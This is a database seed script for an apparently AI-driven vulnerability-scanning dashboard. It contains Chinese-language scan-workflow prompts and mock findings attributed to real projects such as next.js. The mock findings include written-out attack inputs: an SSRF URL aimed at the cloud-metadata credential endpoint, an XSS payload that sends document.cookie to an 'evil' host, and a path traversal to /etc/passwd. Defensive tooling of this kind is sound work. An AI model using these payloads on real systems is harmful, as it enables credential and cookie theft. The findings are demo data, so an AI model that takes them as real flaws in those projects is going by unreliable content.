// Adds the demo data shown in the design mockup so the UI has something to render.
// This seed is deliberately additive and idempotent: it never deletes user data.

import { prisma } from '../src/db.js';
import { VULNERABILITIES_TABLE, STEP_RESULTS_TABLE } from '../src/lib/constants.js';
import { ensureDefaultWorkflows } from '../src/lib/defaultWorkflows.js';

const HOUR = 3600 * 1000;
const MIN = 60 * 1000;
const ago = (ms) => new Date(Date.now() - ms);

// ---- workflow blueprints (name, description, levels) -------------------------
const WORKFLOWS = [
  {
    name: 'deep-taint-v3',
    description: '从输入源到危险操作的污点分析，并在最后确认可利用性。',
    levels: [
      {
        depth: 0,
        multiOutput: false,
        outputFormat: { entrypoints: 'array', framework: 'string', attack_surface: 'string' },
        steps: [
          {
            name: '梳理外部入口',
            content:
              '你正在分析 {{repo_full}} 的提交 {{commit_sha}}。\n范围：{{repo_scope}}。依赖：{{dependencies}}。\n\n列出所有可从外部触达的入口（HTTP 路由、CLI 命令、队列消费者）。逐一记录所用框架及其暴露的攻击面。给人读的说明用简体中文写完整句子，不要写英文段落。路径、代码符号和输出字段名保持原样。',
          },
        ],
      },
      {
        depth: 1,
        multiOutput: true,
        outputFormat: { sink: 'string', source: 'string', flow_path: 'array', confidence: 'number' },
        steps: [
          {
            name: '追踪污点流——服务端',
            content:
              '以 {{framework}} 上的入口 {{entrypoints}} 为起点，在攻击面 {{attack_surface}} 中，将每条受污染的数据流从输入源追踪至危险操作。每条不同的数据流输出一条记录。给人读的说明用简体中文写完整句子，不要写英文段落。路径、代码符号和输出字段名保持原样。',
          },
          {
            name: '追踪污点流——客户端',
            content:
              '检查从 {{entrypoints}} 可达的客户端渲染路径。从 DOM 和 eval 危险操作反向追踪数据来源。每条不同的数据流输出一条记录。给人读的说明用简体中文写完整句子，不要写英文段落。路径、代码符号和输出字段名保持原样。',
          },
        ],
      },
      {
        depth: 2,
        multiOutput: false,
        outputFormat: {
          vulnerability_type: 'string',
          summary: 'string',
          explanation: 'string',
          file_path: 'string',
          line: 'number',
          trigger_flow: 'array',
          malicious_input_example: 'string',
          malicious_actor: 'string',
          exploitable: 'boolean',
        },
        steps: [
          {
            name: '确认可利用性',
            content:
              '逐一判断以下数据流在 {{repo_full}} 中是否确实可被利用：{{sink}} ← {{source}}，路径为 {{flow_path}}，置信度为 {{confidence}}。构造具体的攻击输入，并说明什么角色可以触发它。给人读的说明用简体中文写完整句子，不要写英文段落。攻击载荷、路径、代码符号和输出字段名保持原样。',
          },
        ],
      },
    ],
  },
  {
    name: 'authz-sweep',
    description: '梳理角色与资源的对应关系，再检查是否缺少授权校验。',
    levels: [
      {
        depth: 0,
        multiOutput: false,
        outputFormat: { roles: 'array', resources: 'array' },
        steps: [
          {
            name: '梳理角色与资源',
            content:
              '枚举 {{repo_full}} 中的角色与受保护资源。给人读的说明用简体中文写完整句子，不要写英文段落。代码符号保持原样。',
          },
        ],
      },
      {
        depth: 1,
        multiOutput: true,
        outputFormat: { handler: 'string', missing_role: 'string', evidence: 'string' },
        steps: [
          {
            name: '查找缺失的授权校验',
            content:
              '逐一检查 {{resources}} 中的资源，找出缺少对 {{roles}} 进行授权校验的处理函数。给人读的说明用简体中文写完整句子，不要写英文段落。代码符号保持原样。',
          },
        ],
      },
      {
        depth: 2,
        multiOutput: false,
        outputFormat: {
          vulnerability_type: 'string',
          summary: 'string',
          explanation: 'string',
          file_path: 'string',
          line: 'number',
          trigger_flow: 'array',
          malicious_input_example: 'string',
          malicious_actor: 'string',
          exploitable: 'boolean',
        },
        steps: [
          {
            name: '确认可利用性',
            content:
              '确认 {{handler}} 绕过 {{missing_role}} 角色校验是否可被利用。给人读的说明用简体中文写完整句子，不要写英文段落。代码符号保持原样。',
          },
        ],
      },
    ],
  },
  {
    name: 'memory-safety',
    description: '分析 C/C++ 及 Rust unsafe 原生代码中的缓冲区和对象生命周期。',
    levels: [
      {
        depth: 0,
        multiOutput: false,
        outputFormat: { surfaces: 'array' },
        steps: [
          {
            name: '定位原生代码攻击面',
            content:
              '查找 {{repo_full}} 中的 FFI 与 unsafe 代码块。给人读的说明用简体中文写完整句子，不要写英文段落。代码符号保持原样。',
          },
        ],
      },
      {
        depth: 1,
        multiOutput: true,
        outputFormat: {
          vulnerability_type: 'string',
          summary: 'string',
          explanation: 'string',
          file_path: 'string',
          line: 'number',
          trigger_flow: 'array',
          malicious_input_example: 'string',
          malicious_actor: 'string',
          exploitable: 'boolean',
        },
        steps: [
          {
            name: '确认内存安全缺陷',
            content:
              '逐一检查 {{surfaces}}，确认是否存在内存安全违规。给人读的说明用简体中文写完整句子，不要写英文段落。代码符号保持原样。',
          },
        ],
      },
    ],
  },
  {
    name: 'secrets-scan',
    description: '单轮扫描已提交到代码库的凭据和不安全的加密实现。',
    levels: [
      {
        depth: 0,
        multiOutput: true,
        outputFormat: {
          vulnerability_type: 'string',
          summary: 'string',
          explanation: 'string',
          file_path: 'string',
          line: 'number',
          trigger_flow: 'array',
          malicious_input_example: 'string',
          malicious_actor: 'string',
          exploitable: 'boolean',
        },
        steps: [
          {
            name: '扫描泄露凭据与加密缺陷',
            content:
              '扫描 {{repo_full}}，查找已提交的秘密信息和不安全的加密实现。给人读的说明用简体中文写完整句子，不要写英文段落。代码符号保持原样。',
          },
        ],
      },
    ],
  },
];

const POST_SCRIPTS = [
  {
    name: 'cvss-grader',
    description: '为每条发现给出 CVSS 评分向量、对应的 CWE 和置信度等级。',
    content:
      '为发现“{{summary}}”评级：漏洞类型为 {{vulnerability_type}}，位置为 {{file_path}}:{{line}}。\n\n根据 {{explanation}} 和 {{malicious_input_example}} 给出 CVSS v3.1 向量，推导严重性等级，并选出一个最具体的 CWE。评估 {{exploitable}} 是否已有证据确认。评级说明用简体中文，不要写英文段落。CVSS 向量、CWE 编号、严重性枚举和输出字段名保持原样。',
    outputFormat: { severity: 'string', cvss_vector: 'string', cwe: 'string' },
  },
  {
    name: 'patch-suggester',
    description: '为受影响文件起草最小修复建议和 unified diff 格式补丁。',
    content:
      '针对 {{file_path}} 中的“{{summary}}”，沿 {{trigger_flow}} 检查并起草最小且安全的修复方案。输出面向读者的修复说明，以及消除 {{vulnerability_type}} 的 unified diff 格式补丁。修复说明用简体中文，不要写英文段落。unified diff、路径、代码符号和输出字段名保持原样。',
    outputFormat: { remediation: 'string', patch_diff: 'string' },
  },
  {
    name: 'dedupe-cluster',
    description: '将同层步骤中的重复发现聚为一组，归并为一份主报告。',
    content:
      '将 {{file_path}} 中的“{{summary}}”与此前同属 {{vulnerability_type}} 的发现进行比较。分配稳定的分组标识，并标明此记录是否为该组的主记录。分组说明用简体中文，不要写英文段落。分组标识和输出字段名保持原样。',
    outputFormat: { cluster_id: 'string', is_canonical: 'boolean' },
  },
];

// ---- findings (json_answer + post_script_answer) ----------------------------
const VULNS = [
  {
    vulnerability_type: 'SSRF',
    summary: 'Image optimizer fetches attacker-controlled URLs server-side',
    file_path: 'packages/next/server/image-optimizer.ts',
    line: 142,
    exploitable: true,
    explanation:
      'The `_next/image` endpoint passes the user-supplied `url` query parameter directly into a server-side `fetch()` after an allow-list check that only validates the hostname suffix. An attacker can supply `https://allowed.com@169.254.169.254/` to bypass the suffix check and reach internal metadata endpoints, exfiltrating cloud credentials through the optimizer response.',
    malicious_input_example:
      'GET /_next/image?url=https://cdn.allowed.com@169.254.169.254/latest/meta-data/iam/security-credentials/&w=64&q=75',
    malicious_actor: 'Unauthenticated remote user',
    trigger_flow: [
      'User requests /_next/image with crafted url param',
      'Hostname suffix check passes on the @-prefixed authority',
      'fetch() resolves to 169.254.169.254 metadata service',
      'Response body is proxied back to the attacker',
    ],
    post: {
      severity: 'High',
      cvss_vector: 'AV:N/AC:L/PR:N/UI:N',
      cwe: 'CWE-918',
      exploit_confidence: 'confirmed',
      remediation:
        'Parse the URL and compare the resolved host against an IP allow-list; reject userinfo (@) authorities.',
    },
  },
  {
    vulnerability_type: 'XSS',
    summary: 'Reflected XSS in dev error overlay frame source',
    file_path: 'packages/next/client/dev/error-overlay.tsx',
    line: 88,
    exploitable: true,
    explanation:
      'The error overlay renders the failing module path into the DOM with `dangerouslySetInnerHTML` to support syntax highlighting. A route that echoes an unescaped path segment into a build error reflects attacker markup into the overlay during development sessions.',
    malicious_input_example:
      '/__nextjs_original-stack-frame?file=<img src=x onerror=fetch(`//evil/${document.cookie}`)>',
    malicious_actor: 'Remote attacker phishing a developer',
    trigger_flow: [
      'Attacker sends a crafted dev URL to a developer',
      'Build error embeds the unescaped file path',
      'Overlay injects it via dangerouslySetInnerHTML',
      'onerror handler fires in the developer origin',
    ],
    post: {
      severity: 'High',
      cvss_vector: 'AV:N/AC:L/PR:N/UI:R',
      cwe: 'CWE-79',
      exploit_confidence: 'confirmed',
      remediation: 'Escape the file path or render it as text content rather than HTML.',
    },
  },
  {
    vulnerability_type: 'Path Traversal',
    summary: 'Static file handler resolves ../ outside public root',
    file_path: 'packages/next/server/serve-static.ts',
    line: 230,
    exploitable: true,
    explanation:
      '`serveStatic` joins the request path to the public directory before normalization on Windows back-slash separators, allowing `..\\..\\` sequences to escape the intended root and read arbitrary files the server process can access.',
    malicious_input_example: 'GET /_next/static/..%5c..%5c..%5cetc%5cpasswd',
    malicious_actor: 'Unauthenticated remote user',
    trigger_flow: [
      'Request encodes back-slash traversal in the static path',
      'path.join runs before decode normalization',
      'Resolved path escapes the public root',
      'File contents returned in the response',
    ],
    post: {
      severity: 'Medium',
      cvss_vector: 'AV:N/AC:L/PR:N/UI:N',
      cwe: 'CWE-22',
      exploit_confidence: 'confirmed',
      remediation: 'Normalize and decode before resolving; assert the resolved path stays within the root.',
    },
  },
  {
    vulnerability_type: 'Open Redirect',
    summary: 'Middleware honors absolute redirect targets from query',
    file_path: 'packages/next/server/router.ts',
    line: 410,
    exploitable: false,
    explanation:
      'The redirect helper allows absolute URLs in the `next` parameter. Phishing-grade open redirect, but framed by the post-script as low severity because it requires user interaction and leaks no data directly.',
    malicious_input_example: '/login?next=https://evil.example/phish',
    malicious_actor: 'Phishing campaign',
    trigger_flow: ['User clicks a link with an absolute next param', 'Middleware issues a 307 to the external host'],
    post: {
      severity: 'Low',
      cvss_vector: 'AV:N/AC:L/PR:N/UI:R',
      cwe: 'CWE-601',
      exploit_confidence: 'likely',
      remediation: 'Allow only same-origin relative redirect targets.',
    },
  },
  {
    vulnerability_type: 'Prototype Pollution',
    summary: 'Config merge mutates Object.prototype via __proto__ key',
    file_path: 'packages/next/lib/merge-config.ts',
    line: 55,
    exploitable: false,
    explanation:
      'Deep-merge of user next.config does not guard `__proto__`. Requires the attacker to control config input, which is build-time only — flagged not-exploitable at runtime but worth hardening.',
    malicious_input_example: '{ "__proto__": { "polluted": true } }',
    malicious_actor: 'Malicious dependency at build time',
    trigger_flow: ['Build merges attacker-influenced config', '__proto__ key walks into Object.prototype'],
    post: {
      severity: 'Low',
      cvss_vector: 'AV:L/AC:H/PR:L/UI:N',
      cwe: 'CWE-1321',
      exploit_confidence: 'theoretical',
      remediation: 'Skip __proto__/constructor keys during merge.',
    },
  },
  {
    vulnerability_type: 'ReDoS',
    summary: 'Catastrophic backtracking in route matcher regex',
    file_path: 'packages/next/shared/route-regex.ts',
    line: 73,
    exploitable: false,
    explanation:
      'A nested quantifier in the dynamic-route matcher can be driven to super-linear time with a crafted long path, but practical impact is bounded by upstream length limits.',
    malicious_input_example: '/' + 'a'.repeat(40) + '!',
    malicious_actor: 'Unauthenticated remote user',
    trigger_flow: ['Long crafted path hits the matcher', 'Nested quantifier backtracks super-linearly'],
    post: {
      severity: 'Low',
      cvss_vector: 'AV:N/AC:H/PR:N/UI:N',
      cwe: 'CWE-1333',
      exploit_confidence: 'theoretical',
      remediation: 'Bound the quantifier or pre-limit path length.',
    },
  },
  {
    vulnerability_type: 'Insecure Deserialization',
    summary: 'Cache layer deserializes untrusted entries without validation',
    file_path: 'packages/next/server/cache.ts',
    line: 198,
    exploitable: false,
    explanation:
      'Incremental cache reads JSON without schema validation. Low risk because writes are server-controlled; included for completeness.',
    malicious_input_example: '(requires write access to the cache directory)',
    malicious_actor: 'Local attacker with FS access',
    trigger_flow: ['Attacker writes a poisoned cache entry', 'Server reads and trusts the shape'],
    post: {
      severity: 'Info',
      cvss_vector: 'AV:L/AC:H/PR:H/UI:N',
      cwe: 'CWE-502',
      exploit_confidence: 'theoretical',
      remediation: 'Validate cache entries against a schema on read.',
    },
  },
];

// ---- scans ------------------------------------------------------------------
const SCANS = [
  {
    repo: 'vercel/next.js',
    workflow: 'deep-taint-v3',
    model: 'gpt-5-codex',
    harness: 'codex',
    commit: 'a3f9c21',
    status: 'completed',
    postScript: 'cvss-grader',
    vulnSlice: [0, 7],
    insertedAt: ago(2 * HOUR),
  },
  {
    repo: 'supabase/supabase',
    workflow: 'deep-taint-v3',
    model: 'claude-opus-4',
    harness: 'claude-code',
    commit: '7b1e004',
    status: 'running',
    postScript: 'cvss-grader',
    vulnSlice: null,
    insertedAt: ago(12 * MIN),
  },
  {
    repo: 'stripe/stripe-node',
    workflow: 'authz-sweep',
    model: 'gpt-5-codex',
    harness: 'codex',
    commit: 'c90fd12',
    status: 'pending',
    postScript: 'cvss-grader',
    vulnSlice: null,
    insertedAt: ago(1 * MIN),
  },
  {
    repo: 'denoland/deno',
    workflow: 'deep-taint-v3',
    model: 'claude-sonnet-4',
    harness: 'claude-code',
    commit: '0e7a55b',
    status: 'completed',
    postScript: 'cvss-grader',
    vulnSlice: [0, 2],
    insertedAt: ago(24 * HOUR),
  },
  {
    repo: 'redis/redis',
    workflow: 'memory-safety',
    model: 'gpt-5-codex',
    harness: 'codex',
    commit: '4dd1aa0',
    status: 'failed',
    postScript: 'cvss-grader',
    vulnSlice: null,
    insertedAt: ago(3 * HOUR),
  },
  {
    repo: 'prisma/prisma',
    workflow: 'authz-sweep',
    model: 'claude-opus-4',
    harness: 'claude-code',
    commit: 'b2c8e91',
    status: 'stopped',
    postScript: 'cvss-grader',
    vulnSlice: [3, 4],
    insertedAt: ago(5 * HOUR),
  },
  {
    repo: 'fastapi/fastapi',
    workflow: 'deep-taint-v3',
    model: 'gpt-5-codex',
    harness: 'codex',
    commit: 'f01a7cd',
    status: 'completed',
    postScript: 'cvss-grader',
    vulnSlice: [0, 4],
    insertedAt: ago(6 * HOUR),
  },
  {
    repo: 'expressjs/express',
    workflow: 'authz-sweep',
    model: 'claude-sonnet-4',
    harness: 'claude-code',
    commit: '9ab3f70',
    status: 'completed',
    postScript: 'cvss-grader',
    vulnSlice: [0, 3],
    insertedAt: ago(8 * HOUR),
  },
];

async function main() {
  console.log('Adding open-kritt demo data (existing data is preserved)…');

  // Post-scripts
  const psByName = new Map();
  for (const ps of POST_SCRIPTS) {
    const existing = await prisma.postScript.findFirst({
      where: { name: ps.name },
      orderBy: { insertedAt: 'asc' },
    });
    const saved =
      existing ||
      (await prisma.postScript.create({
        data: {
          name: ps.name,
          description: ps.description,
          content: ps.content,
          outputFormat: JSON.stringify(ps.outputFormat),
        },
      }));
    psByName.set(ps.name, saved);
  }

  // Workflows + steps
  const wfByName = new Map();
  for (const wf of WORKFLOWS) {
    const existing = await prisma.workflow.findFirst({
      where: { name: wf.name },
      orderBy: { insertedAt: 'asc' },
    });
    if (existing?.stepIds?.length) {
      wfByName.set(wf.name, existing);
      continue;
    }

    const maxDepth = Math.max(...wf.levels.map((l) => l.depth));
    const stepIds = [];
    for (const level of [...wf.levels].sort((a, b) => a.depth - b.depth)) {
      const isLast = level.depth === maxDepth;
      for (const step of level.steps) {
        const created = await prisma.step.create({
          data: {
            content: step.content,
            outputFormat: JSON.stringify(level.outputFormat),
            name: step.name,
            depth: level.depth,
            multiOutput: level.multiOutput,
            isLastStep: isLast,
            outputTable: isLast ? VULNERABILITIES_TABLE : STEP_RESULTS_TABLE,
          },
        });
        stepIds.push(created.id);
      }
    }
    const data = { name: wf.name, description: wf.description, stepIds };
    const saved = existing
      ? await prisma.workflow.update({ where: { id: existing.id }, data })
      : await prisma.workflow.create({ data });
    wfByName.set(wf.name, saved);
  }
  await ensureDefaultWorkflows(prisma);

  // Scans + findings
  for (const sc of SCANS) {
    const wf = wfByName.get(sc.workflow);
    const ps = psByName.get(sc.postScript);
    const existing = await prisma.scan.findFirst({
      where: {
        workflowId: wf.id,
        postScriptId: ps.id,
        repoFull: sc.repo,
        commitSha: sc.commit,
        model: sc.model,
        harness: sc.harness,
      },
      orderBy: { insertedAt: 'asc' },
    });
    if (existing) continue;

    const scan = await prisma.scan.create({
      data: {
        workflowId: wf.id,
        postScriptId: ps.id,
        repoFull: sc.repo,
        commitSha: sc.commit,
        repoScope: 'full repository',
        dependencies: [],
        configuration: { max_files: 4000, include_tests: false },
        model: sc.model,
        harness: sc.harness,
        status: sc.status,
        config: {},
        scopes: { files: [], lines: [] },
        insertedAt: sc.insertedAt,
      },
    });

    if (sc.vulnSlice) {
      const [from, to] = sc.vulnSlice;
      const slice = VULNS.slice(from, to);
      let rank = 1;
      for (const vuln of slice) {
        const { post, ...answer } = vuln;
        await prisma.vulnerability.create({
          data: {
            scanId: scan.id,
            workflowId: wf.id,
            scanMetadataId: 0n,
            prevId: 0n,
            rank: rank++,
            jsonAnswer: answer,
            postScriptAnswer: post,
          },
        });
      }
    }
  }

  const counts = {
    workflows: await prisma.workflow.count(),
    steps: await prisma.step.count(),
    postScripts: await prisma.postScript.count(),
    scans: await prisma.scan.count(),
    vulnerabilities: await prisma.vulnerability.count(),
  };
  console.log('Seed complete:', counts);
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
